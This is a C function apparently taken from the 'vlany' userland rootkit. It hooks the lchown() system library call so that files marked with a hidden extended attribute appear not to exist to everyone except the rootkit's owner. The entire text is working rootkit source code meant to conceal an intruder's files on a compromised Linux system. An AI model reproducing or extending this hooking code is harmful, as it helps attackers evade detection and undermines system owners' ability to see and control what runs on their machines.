int lchown(const char *path, uid_t owner, gid_t group)
{
    #ifdef DEBUG
        printf("[vlany] lchown() called\n");
    #endif

    HOOK(old_lchown, CLCHOWN);

    if(owned()) return old_lchown(path, owner, group);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_lchown(path, owner, group);
}
